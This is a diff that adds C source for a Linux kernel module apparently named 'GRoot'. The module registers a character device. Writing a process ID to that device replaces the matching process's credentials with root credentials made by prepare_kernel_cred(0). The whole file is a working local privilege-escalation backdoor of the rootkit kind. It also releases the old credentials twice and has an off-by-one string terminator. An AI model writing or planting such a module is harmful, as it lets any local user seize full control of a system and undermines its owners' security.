@@ -1,0 +1,80 @@
+#include "GRoot.h"
+
+static int __init InitModule(void)
+{
+        major = register_chrdev(0, DEVICE_NAME, &fops);
+        pid = -1;
+        
+        if(major < 0) {    
+                printk(KERN_ALERT DEVICE_NAME": Registering the character device failed with %d\n", major);
+                
+                return major;
+        }
+        printk(KERN_ALERT DEVICE_NAME": MJ %d MN 1\n", major);
+        
+        return 0;
+}
+
+static void __exit ExitModule(void)
+{
+        unregister_chrdev(major, DEVICE_NAME);    
+}
+
+module_init(InitModule);
+module_exit(ExitModule);
+
+static int device_open(struct inode *inode, struct file *file)
+{
+        try_module_get(THIS_MODULE);
+
+        return SUCCESS;
+}
+static int device_release(struct inode *inode, struct file *file)
+{
+        module_put(THIS_MODULE);
+
+        return SUCCESS;
+}
+static ssize_t device_write(struct file *filep, const char *buffer, size_t lenght, loff_t *offset)
+{
+        char data[BUF_LEN] = "";
+        size_t readed = 0;
+        struct task_struct *find;
+        struct cred *root_cred;
+        const struct cred *old_cred = NULL;
+        
+        while(readed < BUF_LEN && readed < lenght){
+                get_user(*(data + readed), buffer++);
+                readed++;
+        }
+        if(readed >= BUF_LEN - 1){
+                data[BUF_LEN - 1] = '\0';
+        } else {
+                data[readed + 1] = '\0';
+        }
+        
+        pid = simple_strtoul(data, NULL, 0);
+        printk(KERN_ALERT DEVICE_NAME": Current %s (%d)\n", current->comm, current->pid);
+        printk(KERN_ALERT DEVICE_NAME": Finding pid %d...\n", pid);
+        for_each_process(find){
+                //printk(KERN_ALERT DEVICE_NAME": %s (%d)\n", find->comm, find->pid);
+                if(pid == find->pid){;
+                        printk(KERN_ALERT DEVICE_NAME": Set root to %s (%d)...\n", find->comm, find->pid);
+                        
+                        rcu_assign_pointer(old_cred, find->real_cred);
+                        root_cred = prepare_kernel_cred(0);
+                        rcu_assign_pointer(find->real_cred, root_cred);
+                        rcu_assign_pointer(find->cred, root_cred);                        
+                        put_cred(old_cred);
+                        put_cred(old_cred);
+                        
+                        printk(KERN_ALERT DEVICE_NAME": Success!\n");
+                        break;
+                }
+        }
+        if(find == &init_task){
+                printk(KERN_ALERT DEVICE_NAME": pid %d not found\n", pid);
+        }
+
+        return readed;
+}
